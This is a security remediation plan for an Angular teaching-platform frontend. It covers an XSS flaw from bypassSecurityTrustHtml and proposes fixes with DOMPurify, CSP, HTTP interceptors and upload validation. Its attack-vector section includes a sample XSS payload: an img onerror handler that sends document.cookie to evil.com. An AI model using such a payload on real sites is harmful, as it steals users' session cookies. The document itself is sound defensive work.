# Security Optimization Plan

> **Goal**: Achieve 10/10 security posture for the TeacherSuite Angular frontend  
> **Current Rating**: 5/10  
> **Angular Version**: 21.0.0

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Current State Analysis](#current-state-analysis)
3. [Critical Issues](#critical-issues)
4. [High Priority Issues](#high-priority-issues)
5. [Medium Priority Issues](#medium-priority-issues)
6. [Best Practices Checklist](#best-practices-checklist)
7. [Implementation Roadmap](#implementation-roadmap)
8. [Sources & References](#sources--references)

---

## Executive Summary

The TeacherSuite frontend has solid foundations with Keycloak PKCE authentication, but contains a **critical XSS vulnerability** via `bypassSecurityTrustHtml()`, lacks Content Security Policy headers, and has no input sanitization pipeline. This plan addresses all identified vulnerabilities and brings the security posture to production-grade.

---

## Current State Analysis

### What Works Well ✅

| Feature | Details |
|---------|---------|
| **Keycloak PKCE** | Uses `pkceMethod: 'S256'` — best practice for SPAs |
| **Token Auto-Refresh** | `onTokenExpired` handler refreshes tokens before expiry |
| **Bearer Token Injection** | All API calls include `Authorization: Bearer <token>` |
| **Stale OIDC Cleanup** | Clears `kc-callback-*` entries from localStorage |
| **Route Guards** | `authGuard` and `roleGuard` protect authenticated routes |
| **Role-Based UI** | Admin/Supervisor/Teacher role checks in components |

### Current Vulnerabilities ❌

| Severity | Issue | Location |
|----------|-------|----------|
| **CRITICAL** | XSS via `bypassSecurityTrustHtml()` | `lesson-detail.ts:121-124` |
| **HIGH** | No Content Security Policy | Missing CSP headers |
| **HIGH** | Raw `fetch()` without interceptors | `api.service.ts` |
| **MEDIUM** | No CSRF protection | All API calls |
| **MEDIUM** | No input sanitization pipeline | Form inputs across all pages |
| **LOW** | Hardcoded Keycloak config | `environment.ts` |

---

## Critical Issues

### 1. XSS Vulnerability via `bypassSecurityTrustHtml()` 🔴

**Location**: `src/app/pages/lesson-detail/lesson-detail.ts:121-124`

```typescript
// CURRENT — VULNERABLE
this.markdownContent = this.sanitizer.bypassSecurityTrustHtml(html);
```

**Problem**: `bypassSecurityTrustHtml()` completely bypasses Angular's built-in XSS protection. If a user uploads a `.md` file containing `<script>` tags, `<img onerror="...">`, or other HTML injection payloads, they will execute in the browser of every user viewing that lesson.

**Attack Vector**:
1. Teacher uploads a `.md` file: `# Hello <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
2. `marked.parse()` converts it to HTML including the malicious `<img>` tag
3. `bypassSecurityTrustHtml()` trusts it completely
4. Every user viewing the lesson detail executes the script

**Fix — Use DOMPurify for HTML Sanitization**:

```typescript
// RECOMMENDED — Install DOMPurify
// npm install dompurify @types/dompurify

import DOMPurify from 'dompurify';

// In lesson-detail.ts
private async renderMarkdown(text: string): Promise<void> {
  const rawHtml = await marked.parse(text);
  const sanitizedHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'a', 'ul', 'ol', 'li',
                   'code', 'pre', 'blockquote', 'em', 'strong', 'table', 'thead',
                   'tbody', 'tr', 'th', 'td', 'br', 'hr', 'img'],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
    ALLOW_DATA_ATTR: false,
  });
  this.markdownContent = this.sanitizer.bypassSecurityTrustHtml(sanitizedHtml);
  this.cdr.detectChanges();
}
```

**Alternative — Use Angular's built-in sanitizer**:
```typescript
// If DOMPurify is not desired, use Angular's DomSanitizer.sanitize()
import { SecurityContext } from '@angular/core';

const sanitized = this.sanitizer.sanitize(SecurityContext.HTML, rawHtml);
this.markdownContent = sanitized ?? '';
// Then bind with [innerHTML]="markdownContent" (string, not SafeHtml)
```

> **Angular Best Practice**: "Never use `bypassSecurityTrustHtml()` unless the content is from a trusted source AND has been pre-sanitized."  
> — [Angular Security Guide](https://angular.dev/best-practices/security)

---

## High Priority Issues

### 2. No Content Security Policy (CSP)

**Problem**: No CSP headers are configured, allowing inline scripts and any external resource loading.

**Fix**: Configure CSP headers on the server (ASP.NET backend) or via `<meta>` tag:

```html
<!-- In index.html -->
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self';
           style-src 'self' 'unsafe-inline';
           img-src 'self' data: blob:;
           font-src 'self';
           connect-src 'self' https://your-keycloak-domain;
           frame-src 'none';
           object-src 'none';">
```

> **Source**: [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### 3. Replace Raw `fetch()` with Angular `HttpClient`

**Problem**: `api.service.ts` uses native `fetch()` wrapped in `from(Promise)`. This bypasses Angular's `HttpInterceptor` chain, meaning:
- No global error interceptor
- No global auth interceptor (token is manually attached per-request)
- No request/response logging
- No retry logic
- No XSRF/CSRF protection via `HttpClientXsrfModule`

**Fix**: Migrate to `HttpClient` with interceptors:

```typescript
// api.service.ts — using HttpClient
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Injectable({ providedIn: 'root' })
export class ApiService {
  private http = inject(HttpClient);

  protected get<T>(url: string): Observable<T> {
    return this.http.get<T>(url);
  }
  // ... similar for post, put, delete
}

// app.config.ts — register interceptors
import { provideHttpClient, withInterceptors } from '@angular/common/http';

export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withInterceptors([authInterceptor, errorInterceptor])
    ),
  ],
};
```

> **Angular Best Practice**: "Use `HttpClient` for all HTTP communications. It provides typed responses, interceptors, request/response transformation, and testability."  
> — [Angular HttpClient Guide](https://angular.dev/guide/http)

### 4. Auth Interceptor (Centralized Token Management)

**Current Problem**: Token is attached in `ApiService.getAuthHeaders()` — duplicated logic, easy to miss.

```typescript
// auth.interceptor.ts
import { HttpInterceptorFn } from '@angular/common/http';

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const keycloak = inject(KeycloakService);

  if (keycloak.isAuthenticated()) {
    return from(keycloak.updateToken(30)).pipe(
      switchMap(() => {
        const token = keycloak.getToken();
        const authReq = req.clone({
          setHeaders: { Authorization: `Bearer ${token}` }
        });
        return next(authReq);
      })
    );
  }
  return next(req);
};
```

---

## Medium Priority Issues

### 5. No CSRF/XSRF Protection

**Problem**: The app makes state-changing requests (POST, PUT, DELETE) without CSRF tokens.

**Mitigation**: Since the backend uses JWT Bearer tokens (not cookies), CSRF is partially mitigated. However, best practice is to:
- Ensure `SameSite=Strict` on any cookies
- Use `HttpClient` with `withXsrfConfiguration()` if cookie-based auth is ever added

### 6. Input Sanitization

**Problem**: User inputs (names, emails, descriptions) are passed directly to the API without client-side sanitization.

**Fix**: Add a shared sanitization utility:

```typescript
// shared/utils/sanitize.ts
export function sanitizeInput(value: string): string {
  return value
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .trim();
}
```

### 7. File Upload Security

**Location**: `lessons.ts:24` — `ALLOWED_EXTENSIONS = ['.md', '.docx', '.txt']`

**Current**: Extension-only validation is insufficient.

**Fix**:
- Validate MIME type in addition to extension
- Enforce file size limits on the client
- Server should re-validate (defense in depth)

```typescript
private readonly MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

onModalFileSelected(event: Event) {
  const file = files[i];
  if (file.size > this.MAX_FILE_SIZE) {
    this.fileError = `File "${file.name}" exceeds the 10MB limit.`;
    return;
  }
  // Also validate MIME type
  const allowedMimeTypes = [
    'text/markdown', 'text/plain',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
  ];
  if (!allowedMimeTypes.includes(file.type)) {
    this.fileError = `File "${file.name}" has an unsupported file type.`;
    return;
  }
}
```

### 8. Secure Environment Configuration

**Problem**: `environment.prod.ts` uses `${KEYCLOAK_URL}` template placeholder.

**Fix**: Use Angular's `fileReplacements` in `angular.json` production build:

```json
"production": {
  "fileReplacements": [{
    "replace": "src/environments/environment.ts",
    "with": "src/environments/environment.prod.ts"
  }]
}
```

---

## Best Practices Checklist

| # | Practice | Status | Priority |
|---|----------|--------|----------|
| 1 | Sanitize all dynamic HTML with DOMPurify | ❌ | Critical |
| 2 | Use Angular's `HttpClient` instead of `fetch()` | ❌ | High |
| 3 | Implement auth interceptor | ❌ | High |
| 4 | Add Content Security Policy headers | ❌ | High |
| 5 | Validate file MIME types + size on upload | ⚠️ Partial | Medium |
| 6 | Configure `fileReplacements` for prod env | ❌ | Medium |
| 7 | Sanitize user inputs before API submission | ❌ | Medium |
| 8 | Implement error interceptor for global error handling | ❌ | Medium |
| 9 | Use `SameSite=Strict` on cookies | ✅ Backend | Low |
| 10 | PKCE S256 for OAuth | ✅ | Done |
| 11 | Route guards for protected pages | ✅ | Done |
| 12 | Role-based UI visibility | ✅ | Done |

---

## Implementation Roadmap

### Phase 1 — Critical (Week 1)
1. Install DOMPurify and sanitize markdown HTML
2. Remove `bypassSecurityTrustHtml()` or ensure pre-sanitized input

### Phase 2 — High (Week 2-3)
3. Migrate `ApiService` from `fetch()` to `HttpClient`
4. Create `authInterceptor` and `errorInterceptor`
5. Add CSP meta tag or server header

### Phase 3 — Medium (Week 4)
6. Add file MIME type + size validation
7. Configure environment file replacements
8. Add input sanitization utility

---

## Sources & References

| Source | URL |
|--------|-----|
| Angular Security Guide | https://angular.dev/best-practices/security |
| Angular HttpClient Guide | https://angular.dev/guide/http |
| Angular DomSanitizer API | https://angular.dev/api/platform-browser/DomSanitizer |
| OWASP XSS Prevention | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html |
| OWASP CSP Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html |
| DOMPurify Library | https://github.com/cure53/DOMPurify |
| Angular HTTP Interceptors | https://angular.dev/guide/http/interceptors |
| Keycloak JS Adapter | https://www.keycloak.org/docs/latest/securing_apps/#_javascript_adapter |
